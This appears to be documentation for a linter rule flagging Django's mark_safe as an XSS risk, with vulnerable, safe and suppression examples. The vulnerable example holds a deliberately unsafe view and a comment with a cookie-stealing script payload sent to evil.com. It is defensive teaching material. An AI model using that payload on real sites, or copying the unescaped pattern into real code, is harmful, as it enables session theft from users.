# CSP-D105: Use of `mark_safe` in Django

**Vulnerability Category:** `Injection`

**Severity:** `MEDIUM`

## Description

This rule flags the use of `django.utils.safestring.mark_safe`. In Django, template variables are automatically escaped to prevent Cross-Site Scripting (XSS) attacks. The `mark_safe` function is used to explicitly tell Django's template engine that a string is "safe" and should not be escaped.

If `mark_safe` is used on a string that contains untrusted user input, it effectively bypasses Django's primary XSS protection mechanism. This can allow an attacker to inject malicious scripts into the rendered HTML.

## Vulnerable Code Example

```python
from django.http import HttpResponse
from django.utils.safestring import mark_safe

def user_profile(request):
    user_input = request.GET.get('name', '')

    # This is vulnerable. The user's input is being marked as safe.
    # An attacker can provide a name like: <script>document.location='http://evil.com/?c='+document.cookie</script>
    safe_string = mark_safe(f"<h1>Hello, {user_input}!</h1>")

    return HttpResponse(safe_string)
```
In this scenario, the script provided by the attacker would be executed in the browser of any user viewing the page.

## Safe Code Example

The best practice is to avoid `mark_safe` and rely on Django's templating system to handle HTML generation and escaping.

```python
from django.shortcuts import render

def user_profile(request):
    user_input = request.GET.get('name', '')

    # Pass the raw data to the template.
    # The template will handle the HTML structure and escaping.
    context = {'user_name': user_input}
    return render(request, 'user_profile.html', context)
```

**`user_profile.html` template:**
```html
<h1>Hello, {{ user_name }}!</h1>
```
In this safe version, Django's template engine will render the `<h1>` tag and automatically escape the `user_name` variable. If an attacker provides a script, it will be displayed as literal text rather than being executed.

## When is `mark_safe` okay?

`mark_safe` should only be used on content that is known to be safe, such as:
- Content that is generated internally by the application and does not contain any user input.
- HTML that has been sanitized by a robust library like `bleach`.

```python
import bleach
from django.utils.safestring import mark_safe

# The input is cleaned by bleach, removing any dangerous tags or attributes.
cleaned_input = bleach.clean(user_input)

# It is now safe to mark the cleaned content as safe.
safe_string = mark_safe(cleaned_input)
```

## How to Suppress a Finding

If you have validated that the content being passed to `mark_safe` is secure, you can suppress the finding.

```python
# The content is trusted because it is static or has been sanitized.
# ignore
safe_html = mark_safe("<p>This is <strong>safe</strong>.</p>")
```

Or, for this specific rule:

```python
# ignore: CSP-D105
safe_html = mark_safe(sanitized_user_content)
```
